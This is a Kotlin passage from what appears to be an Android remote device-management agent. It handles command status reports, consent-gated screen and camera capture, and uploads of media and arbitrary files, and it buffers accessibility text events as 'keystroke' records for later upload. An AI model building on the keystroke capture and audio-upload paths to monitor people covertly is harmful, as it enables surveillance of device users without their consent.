        val now = System.currentTimeMillis()
        database.commandDao().updateStatus(commandId, "FAILED", null, error, now)
        webSocketManager.sendCommandStatus(commandId, "FAILED", error = error)
        preferenceManager.getAuthToken()?.let { token ->
            try {
                apiClient.getService().updateCommandStatus(
                    "Bearer $token",
                    preferenceManager.getDeviceId(),
                    commandId,
                    CommandStatusUpdate(commandId, preferenceManager.getDeviceId(), "FAILED", errorMessage = error)
                )
            } catch (_: Exception) {}
        }
    }

    /** User-visible declines are REJECTED (not FAILED) — a truthful distinction. */
    suspend fun reportCommandRejected(commandId: String, reason: String) {
        val now = System.currentTimeMillis()
        database.commandDao().updateStatus(commandId, "REJECTED", null, reason, now)
        webSocketManager.sendCommandStatus(commandId, "REJECTED", error = reason)
        preferenceManager.getAuthToken()?.let { token ->
            try {
                apiClient.getService().updateCommandStatus(
                    "Bearer $token",
                    preferenceManager.getDeviceId(),
                    commandId,
                    CommandStatusUpdate(commandId, preferenceManager.getDeviceId(), "REJECTED", errorMessage = reason)
                )
            } catch (_: Exception) {}
        }
    }

    // ------------------------------------------------------------------
    // Capture consent + media uploads
    // ------------------------------------------------------------------

    /**
     * Starts the visible consent flow for a capture command: a persistent
     * notification opens [com.example.ui.CaptureConsentActivity]; nothing is
     * captured until the user allows it and passes the Android system dialog.
     * If nobody responds within the coordinator timeout the command FAILS.
     */
    private fun requestCaptureAuthorization(commandId: String, mode: String) {
        com.example.service.CaptureCoordinator.startPending(commandId, mode)
        scope.launch {
            val intent = Intent(context, com.example.ui.CaptureConsentActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            val pendingIntent = android.app.PendingIntent.getActivity(
                context,
                commandId.hashCode(),
                intent,
                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
            )
            val (title, text) = when (mode) {
                com.example.service.CaptureCoordinator.MODE_SCREENSHOT ->
                    "Screenshot requested" to "Tap to review and authorize a one-frame screen capture."
                com.example.service.CaptureCoordinator.MODE_RECORD_START ->
                    "Screen recording requested" to "Tap to review and authorize screen recording."
                else -> "Photo requested" to "Tap to review and authorize a camera photo."
            }
            val notification = NotificationCompat.Builder(context, DeviceManagerApp.CHANNEL_ALERTS)
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentTitle(title)
                .setContentText(text)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setCategory(NotificationCompat.CATEGORY_ALARM)
                .setAutoCancel(true)
                .setContentIntent(pendingIntent)
                .setFullScreenIntent(pendingIntent, true)
                .build()
            try {
                NotificationManagerCompat.from(context).notify(3900 + (commandId.hashCode() % 1000), notification)
            } catch (_: Exception) {}

            // Time-boxed consent: never leave a command hanging forever.
            kotlinx.coroutines.delay(com.example.service.CaptureCoordinator.TIMEOUT_MS + 2_000)
            val stale = com.example.service.CaptureCoordinator.clearIfStale()
            if (stale != null && stale.commandId == commandId) {
                reportCommandFailure(commandId, "Capture authorization timed out — nobody responded on the device")
            }
        }
    }

    suspend fun uploadScreenshotFile(file: java.io.File, kind: String, width: Int, height: Int): Boolean {
        val token = preferenceManager.getAuthToken() ?: return false
        return try {
            val reqFile = file.asRequestBody("image/jpeg".toMediaTypeOrNull())
            val body = MultipartBody.Part.createFormData("file", file.name, reqFile)
            val res = apiClient.getService().uploadScreenshot(
                "Bearer $token",
                preferenceManager.getDeviceId(),
                body,
                kind.toRequestBody("text/plain".toMediaTypeOrNull()),
                width.toString().toRequestBody("text/plain".toMediaTypeOrNull()),
                height.toString().toRequestBody("text/plain".toMediaTypeOrNull())
            )
            res.isSuccessful
        } catch (e: Exception) {
            Log.e("DeviceRepository", "Screenshot upload failed: ${e.message}")
            false
        }
    }

    suspend fun uploadVideoFile(file: java.io.File, durationMs: Long): Boolean {
        val token = preferenceManager.getAuthToken() ?: return false
        return try {
            val reqFile = file.asRequestBody("video/mp4".toMediaTypeOrNull())
            val body = MultipartBody.Part.createFormData("file", file.name, reqFile)
            val res = apiClient.getService().uploadVideo(
                "Bearer $token",
                preferenceManager.getDeviceId(),
                body,
                durationMs.toString().toRequestBody("text/plain".toMediaTypeOrNull())
            )
            res.isSuccessful
        } catch (e: Exception) {
            Log.e("DeviceRepository", "Video upload failed: ${e.message}")
            false
        }
    }

    /** Buffer an accessibility text event locally (SYNC_KEYSTROKES uploads later). */
    fun recordAccessibilityText(entry: com.example.data.local.entity.KeystrokeEntity) {
        scope.launch {
            try {
                database.keystrokeDao().insert(entry)
                if (database.keystrokeDao().count() > 2000) {
                    database.keystrokeDao().trimTo(1500)
                }
            } catch (_: Exception) {}
        }
    }

    private suspend fun ringAlarmFor(seconds: Int): Boolean {
        return try {
            val audio = context.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
            audio.setStreamVolume(
                android.media.AudioManager.STREAM_ALARM,
                audio.getStreamMaxVolume(android.media.AudioManager.STREAM_ALARM),
                0
            )
            val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_ALARM)
                ?: android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_NOTIFICATION)
            val ringtone = android.media.RingtoneManager.getRingtone(context, uri) ?: return false
            ringtone.play()
            kotlinx.coroutines.delay(seconds * 1000L)
            try { ringtone.stop() } catch (_: Exception) {}
            true
        } catch (e: Exception) {
            false
        }
    }

    private fun vibrateFor(ms: Long): Boolean {
        return try {
            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(android.os.VibrationEffect.createOneShot(ms, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(ms)
            }
            true
        } catch (e: Exception) {
            false
        }
    }

    /**
     * WIPE_DEVICE: removes the agent's OWN data (pairing, tokens, local DB and
     * cached files). Not a factory reset — personal data is untouched. The
     * wipe is performed BEFORE the COMPLETED report so the status is truthful.
     */
    private suspend fun performAgentDataWipe() {
        try { webSocketManager.disconnect() } catch (_: Exception) {}
        try { preferenceManager.clearPairing() } catch (_: Exception) {}
        try { context.deleteDatabase("device_manager.db") } catch (_: Exception) {}
        try { context.cacheDir.deleteRecursively() } catch (_: Exception) {}
        try { context.filesDir.deleteRecursively() } catch (_: Exception) {}
        try {
            context.getSharedPreferences("device_manager_prefs", Context.MODE_PRIVATE)
                .edit().clear().apply()
        } catch (_: Exception) {}
    }

    private suspend fun uploadRecordingFile(file: java.io.File, durationMs: Long) {
        val token = preferenceManager.getAuthToken() ?: return
        try {
            val reqFile = file.asRequestBody("audio/mp4".toMediaTypeOrNull())
            val body = MultipartBody.Part.createFormData("file", file.name, reqFile)
            val durationBody = durationMs.toString().toRequestBody("text/plain".toMediaTypeOrNull())
            apiClient.getService().uploadAudioRecording(
                "Bearer $token",
                preferenceManager.getDeviceId(),
                body,
                durationBody
            )
        } catch (_: Exception) {}
    }

    private suspend fun uploadGenericFile(file: java.io.File, targetPath: String): Boolean {
        val token = preferenceManager.getAuthToken() ?: return false
        try {
            val ext = file.extension.lowercase()
            val mime = when (ext) {
                "jpg", "jpeg", "png", "gif" -> "image/${ext}"
                "mp4", "mkv", "avi", "mov" -> "video/${ext}"
                "mp3", "wav", "m4a", "ogg" -> "audio/${ext}"
                "txt", "csv", "log" -> "text/plain"
                "pdf" -> "application/pdf"
                else -> "application/octet-stream"
            }
            val reqFile = file.asRequestBody(mime.toMediaTypeOrNull())
            val body = MultipartBody.Part.createFormData("file", file.name, reqFile)
            val pathBody = targetPath.toRequestBody("text/plain".toMediaTypeOrNull())
            val res = apiClient.getService().uploadGenericFile(
                "Bearer $token",
                preferenceManager.getDeviceId(),
                body,
                pathBody
            )
            return res.isSuccessful
        } catch (e: Exception) {
            Log.e("DeviceRepository", "File upload failed: ${e.message}")
            return false
        }
    }

    @SuppressLint("MissingPermission")
    private fun showAdminAlertNotification(title: String, message: String) {
        try {
            val notif = NotificationCompat.Builder(context, DeviceManagerApp.CHANNEL_ALERTS)
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentTitle(title)
                .setContentText(message)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .build()
            NotificationManagerCompat.from(context).notify(System.currentTimeMillis().toInt(), notif)
        } catch (_: Exception) {}
    }
}
